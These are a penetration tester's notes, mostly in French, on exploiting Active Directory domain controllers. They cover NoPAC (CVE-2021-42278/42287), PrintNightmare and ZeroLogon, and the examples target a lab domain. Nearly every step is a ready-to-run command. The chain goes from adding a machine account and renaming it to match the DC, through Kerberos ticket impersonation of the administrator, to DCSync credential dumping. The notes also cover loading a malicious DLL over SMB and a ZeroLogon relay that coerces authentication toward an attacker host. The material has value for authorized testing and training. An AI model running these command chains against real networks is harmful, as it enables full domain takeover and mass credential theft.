# Scan with NetExec

```bash
nxc smb <ip> -u 'user' -p 'pass' -M enum_cve

nxc smb <ip> -u 'user' -p 'pass' -M zerologon -M printnightmare -M nopac
```

# NoPAC / samAccountName Spoofing

**CVE-2021-42278 - Usurpation de nom (Name impersonation)**
Les comptes machine doivent avoir un `$` final dans leur nom (attribut `sAMAccountName`), mais aucun processus de validation n'existait pour s'en assurer. Combiné à CVE-2021-42287, cela permettait à des attaquants d'usurper des comptes de contrôleur de domaine.

**CVE-2021-42287 - KDC bamboozling**
Pour demander un Service Ticket, il faut d'abord présenter un TGT. Quand le service ticket demandé n'est pas trouvé par le KDC, celui-ci refait automatiquement une recherche avec un `$` final. Concrètement, si un TGT est obtenu pour `bob`, et que l'utilisateur `bob` est supprimé, utiliser ce TGT pour demander un service ticket pour un autre utilisateur envers lui-même (S4U2self) fera chercher `bob$` dans l'AD par le KDC. Si le compte de contrôleur de domaine `bob$` existe, alors `bob` (l'utilisateur) vient d'obtenir un service ticket pour `bob$` (le compte du contrôleur de domaine) comme n'importe quel autre utilisateur.

## Pré-requis

* Un contrôleur de domaine auquel il manque les patchs de sécurité KB5008380 et KB5008602
* Un compte utilisateur de domaine valide
* Le quota de comptes machine (machine account quota) doit être supérieur à 0

La capacité à modifier les attributs sAMAccountName et servicePrincipalName d'un compte machine est un prérequis de la chaîne d'attaque. À vérifier avec Bloodhound ou NetExec :

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M daclread -o TARGET='testj$'
```

Ou la capacité à ajouter des machines. À valider en vérifiant le quota de comptes machine.

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq
```

Check if the DC is vulnerable

```bash
nxc smb 10.10.10.10 -u '' -p '' -d domain -M nopac
```
## Exploit manuel

Ce qu'on va faire : ajouter une machine, vider le SPN de cette machine, renommer la machine avec le même nom que le DC, obtenir un TGT pour cette machine, remettre le nom d'origine de la machine, obtenir un service ticket avec le TGT obtenu précédemment, et enfin dcsync.

Ajouter une nouvelle machine
```bash
addcomputer.py -computer-name 'fake_computer$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Vider les SPN de notre nouvelle machine (avec l'outil addspn de dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx))
```bash
python addspn.py --clear -t 'fake_computer$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```

Renommer la machine (machine -> DC) [renameMachine.py](https://github.com/ThePorgs/impacket/blob/main/examples/renameMachine.py)
```bash
python renameMachine.py -current-name 'fake_computer$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtenir un TGT
```bash
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

Remettre le nom d'origine de la machine
```bash
python renameMachine.py -current-name 'winterfell' -new-name 'fake_computer$' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtenir un service ticket via S4U2self en présentant le TGT précédent
```bash
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

DCSync en présentant le service ticket
```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```

Nettoyer en supprimant la machine créée, avec le hash du compte administrateur qu'on vient d'obtenir
```bash
# Lister les machines
ldeep ldap -d north.sevenkingdoms.local -s ldap://winterfell.north.sevenkingdoms.local -u 'jon.snow' -p 'iknownothing' computers

# Lister les machines
ldapsearch -x -H ldap://winterfell.north.sevenkingdoms.local -D "jon.snow@north.sevenkingdoms.local" -w 'iknownothing' -b "CN=Computers,DC=north,DC=sevenkingdoms,DC=local" "(objectClass=computer)" sAMAccountName

addcomputer.py -computer-name 'fake_computer$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
```

## Exploit automatique
[noPac.py](https://github.com/Ridter/noPac) (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.

```bash
scanner.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP"
noPac.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP" --impersonate Administrator -dump
```

---
# PrintNightmare

**Scan with NetExec**
```bash
nxc smb <ip> -u '' -p '' -M printnightmare
```

**Check spooler is active**
[[6. Coerce.md#MS-RPRN - PrinterBug (SpoolSample)#]]

**Prepare DLL**
[[../Developpement/DLL Hijacking.md#AddUser (no proxy)#|DLL Hijacking]]
[[../Developpement/Compilation.md#C#|Compilation]]

**Host the payload on a SMB share **
```bash
smbserver.py -smb2support "SHARE" /tmp/share -debug
```

**Run the exploit**
https://github.com/cube0x0/CVE-2021-1675
```
CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\LOCAL_IP\SHARE\adduser.dll'
```

**Cleanup**
After the exploitation you will find your dlls inside : `C:\Windows\System32\spool\drivers\x64\3`
And also inside : `C:\Windows\System32\spool\drivers\x64\3\Old\{id}\`

---
# ZeroLogon (CVE-2020-1472)

**Vulnérabilité** : faille dans le protocole Netlogon (MS-NRPC). L'authentification utilise AES-CFB8 avec un IV à zéro. En envoyant un credential composé uniquement de zéros, il y a ~1 chance sur 256 que le DC accepte. Aucun identifiant nécessaire.

**Check :**
```
netexec smb $DC_IP -u '' -p '' -M zerologon
```

L'exploit direct change le mot de passe machine du DC à une chaîne vide via `NetrServerPasswordSet2`. Cela crée un désalignement entre le mot de passe dans l'AD (vide) et celui stocké localement dans le registre du DC (inchangé). Ce désalignement casse la réplication et d'autres services.
## Technique par relay (non disruptive)

Au lieu de changer le mot de passe, on relay l'authentification d'un DC vers un autre DC via Netlogon. ZeroLogon permet de désactiver le signing/sealing sur la session Netlogon, ce qui rend le relay possible (normalement bloqué). Le DCSync s'opère directement via le relay, sans modification de mot de passe = pas d'impact sur la continuité de service.

**Prérequis :**
- Un compte domaine (pour le coerce)
- Un DC avec le spooler actif (ou un autre vecteur de coerce)
- Un autre DC vulnérable à ZeroLogon

```bash
# Shell 1 : relay vers le DC vulnérable
ntlmrelayx -t dcsync://$DC_VULN -smb2support

# Shell 2 : coerce depuis un autre DC
coercer coerce -t $DC_SPOOLER -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
```